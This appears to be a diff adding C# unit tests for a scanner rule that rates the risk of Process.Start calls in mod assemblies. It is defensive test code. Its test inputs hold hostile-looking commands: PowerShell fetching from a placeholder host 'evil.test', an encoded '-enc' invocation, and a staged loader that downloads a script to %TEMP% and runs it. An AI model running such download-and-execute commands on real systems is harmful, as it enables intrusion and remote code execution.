@@ -15,6 +15,9 @@ public class ProcessStartRuleTests
     private readonly System.Reflection.MethodInfo _determineSeverityMethod =
         typeof(ProcessStartRule).GetMethod("DetermineSeverity",
             System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)!;
+    private readonly System.Reflection.MethodInfo _isSystemAssemblyMethod =
+        typeof(ProcessStartRule).GetMethod("IsSystemAssembly",
+            System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic)!;
 
     private (Severity? severity, string? reason) InvokeDetermineSeverity(
         string targetLower,
@@ -55,6 +58,11 @@ public class ProcessStartRuleTests
         ]);
 
         return ((Severity? severity, string? reason))result!;
+    }
+
+    private bool InvokeIsSystemAssembly(string assemblyName)
+    {
+        return (bool)_isSystemAssemblyMethod.Invoke(null, [assemblyName])!;
     }
 
     [Fact]
@@ -110,6 +118,101 @@ public class ProcessStartRuleTests
         var methodRef = MethodReferenceFactory.CreateWithNullType("Start");
 
         _rule.IsSuspicious(methodRef).Should().BeFalse();
+    }
+
+    [Theory]
+    [InlineData("", false)]
+    [InlineData("System.Net.Http", true)]
+    [InlineData("Microsoft.Extensions.Logging", true)]
+    [InlineData("System.Diagnostics.Process.dll", true)]
+    [InlineData("Custom.System.Diagnostics.Process.dll", false)]
+    public void IsSystemAssembly_VariousAssemblyNames_ReturnsExpected(string assemblyName, bool expected)
+    {
+        InvokeIsSystemAssembly(assemblyName).Should().Be(expected);
+    }
+
+    [Fact]
+    public void AnalyzeContextualPattern_NullMethod_ReturnsEmpty()
+    {
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
+        method.Body = new MethodBody(method);
+        method.Body.GetILProcessor().Emit(OpCodes.Ret);
+
+        var findings = _rule.AnalyzeContextualPattern(null!, method.Body.Instructions, 0, new MethodSignals()).ToList();
+
+        findings.Should().BeEmpty();
+    }
+
+    [Fact]
+    public void AnalyzeContextualPattern_NonProcessStart_ReturnsEmpty()
+    {
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
+        method.Body = new MethodBody(method);
+        method.Body.GetILProcessor().Emit(OpCodes.Ret);
+
+        var methodRef = MethodReferenceFactory.Create("System.IO.File", "OpenRead");
+        var findings = _rule.AnalyzeContextualPattern(methodRef, method.Body.Instructions, 0, new MethodSignals()).ToList();
+
+        findings.Should().BeEmpty();
+    }
+
+    [Fact]
+    public void AnalyzeContextualPattern_SystemAssemblyProcessStart_ReturnsEmpty()
+    {
+        var assembly = AssemblyDefinition.CreateAssembly(
+            new AssemblyNameDefinition("System.Diagnostics.Process", new Version(1, 0, 0, 0)),
+            "System.Diagnostics.Process",
+            ModuleKind.Dll);
+        var module = assembly.MainModule;
+        var typeRef = new TypeReference("System.Diagnostics", "Process", module, module.Assembly.Name);
+        var methodRef = new MethodReference("Start", module.TypeSystem.Void, typeRef);
+        var method = new MethodDefinition("Caller", MethodAttributes.Public, module.TypeSystem.Void);
+        method.Body = new MethodBody(method);
+        method.Body.GetILProcessor().Emit(OpCodes.Call, methodRef);
+
+        var findings = _rule.AnalyzeContextualPattern(methodRef, method.Body.Instructions, 0, new MethodSignals()).ToList();
+
+        findings.Should().BeEmpty();
+    }
+
+    [Fact]
+    public void AnalyzeContextualPattern_CustomProcessStart_ReturnsFindingWithSnippetAndSignals()
+    {
+        var assembly = AssemblyDefinition.CreateAssembly(
+            new AssemblyNameDefinition("MaliciousMod", new Version(1, 0, 0, 0)),
+            "MaliciousMod",
+            ModuleKind.Dll);
+        var module = assembly.MainModule;
+        var type = new TypeDefinition("Malicious", "Runner", TypeAttributes.Public | TypeAttributes.Class, module.TypeSystem.Object);
+        module.Types.Add(type);
+        var method = new MethodDefinition("Launch", MethodAttributes.Public, module.TypeSystem.Void);
+        method.Body = new MethodBody(method);
+        type.Methods.Add(method);
+
+        var processType = new TypeReference("Custom.Diagnostics", "Process", module, module.Assembly.Name);
+        var startRef = new MethodReference("Start", module.TypeSystem.Void, processType)
+        {
+            HasThis = false
+        };
+        startRef.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        startRef.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+
+        var processor = method.Body.GetILProcessor();
+        processor.Emit(OpCodes.Ldstr, "cmd.exe");
+        processor.Emit(OpCodes.Ldstr, "/c powershell -enc SQBFAFgA");
+        processor.Emit(OpCodes.Call, startRef);
+
+        var findings = _rule.AnalyzeContextualPattern(
+            startRef,
+            method.Body.Instructions,
+            method.Body.Instructions.Count - 1,
+            new MethodSignals { HasNetworkCall = true, HasFileWrite = true }).ToList();
+
+        findings.Should().ContainSingle();
+        findings[0].Location.Should().Contain("Custom.Diagnostics.Process.Start");
+        findings[0].Description.Should().Contain("cmd.exe");
+        findings[0].Description.Should().Contain("LOLBin");
+        findings[0].CodeSnippet.Should().Contain(">>>");
     }
 
     [Fact]
@@ -354,6 +457,91 @@ public class ProcessStartRuleTests
 
         result.severity.Should().Be(Severity.Medium);
         result.reason.Should().Be("External process execution");
+    }
+
+    [Theory]
+    [InlineData("powershell.exe", "iwr https://evil.test/payload", null, null, Severity.Critical, "suspicious arguments")]
+    [InlineData("cmd.exe", "%TEMP%\\payload.bat", null, null, Severity.Critical, "temp path")]
+    [InlineData("cmd.exe", "<unknown/no-arguments>", null, null, Severity.High, "LOLBin execution")]
+    [InlineData("random-tool.exe", "-enc SQBFAFgA", null, null, Severity.High, "suspicious arguments")]
+    [InlineData("<dynamic target>", "--verbose", null, null, Severity.Medium, "Unknown target")]
+    [InlineData("<unknown target>", "<unknown/no-arguments>", null, null, Severity.Medium, "Unknown process target")]
+    public void DetermineSeverity_CommonUncoveredBranches_ReturnExpectedSeverity(
+        string targetLower,
+        string argumentsLower,
+        bool? useShellExecute,
+        bool? createNoWindow,
+        Severity expectedSeverity,
+        string expectedReason)
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: targetLower,
+            argumentsLower: argumentsLower,
+            useShellExecute: useShellExecute == true,
+            createNoWindow: createNoWindow == true);
+
+        result.severity.Should().Be(expectedSeverity);
+        result.reason.Should().Contain(expectedReason);
+    }
+
+    [Fact]
+    public void DetermineSeverity_StrongEvasionWithSuspiciousArguments_ReturnsCritical()
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "random-tool.exe",
+            argumentsLower: "-enc SQBFAFgA",
+            createNoWindow: true);
+
+        result.severity.Should().Be(Severity.Critical);
+        result.reason.Should().Contain("evasion and suspicious arguments");
+    }
+
+    [Fact]
+    public void DetermineSeverity_KnownSafeToolWithSuspiciousContext_ReturnsMediumOrHighBranches()
+    {
+        InvokeDetermineSeverity(
+                targetLower: "git.exe",
+                argumentsLower: "https://example.test/repo %TEMP%\\repo",
+                createNoWindow: true)
+            .Should()
+            .Be((Severity.High, "Known tool with suspicious download-and-execute chain"));
+
+        InvokeDetermineSeverity(
+                targetLower: "node.exe",
+                argumentsLower: "-e \"iwr https://evil.test\"",
+                createNoWindow: true)
+            .severity
+            .Should()
+            .Be(Severity.High);
+
+        InvokeDetermineSeverity(
+                targetLower: "dotnet.exe",
+                argumentsLower: "--info")
+            .Should()
+            .Be((Severity.Low, "Known external tool"));
+    }
+
+    [Fact]
+    public void DetermineSeverity_StagedLoaderWithOnlyProcessStartInfoIndicator_ReturnsCritical()
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "random-tool.exe",
+            argumentsLower: "https://evil.test/drop.ps1 %TEMP%\\drop.ps1 && start %TEMP%\\drop.ps1",
+            hasUseShellExecuteIndicator: true);
+
+        result.severity.Should().Be(Severity.Critical);
+        result.reason.Should().Contain("ProcessStartInfo execution indicators");
+    }
+
+    [Fact]
+    public void DetermineSeverity_StagedLoaderWithoutEscalators_ReturnsHigh()
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "random-tool.exe",
+            argumentsLower: "https://evil.test/drop.ps1 %TEMP%\\drop.ps1 && start %TEMP%\\drop.ps1");
+
+        result.severity.Should().Be(Severity.High);
+        result.reason.Should().Contain("Potential staged loader chain");
     }
 
     #region ShouldSuppressFinding Tests
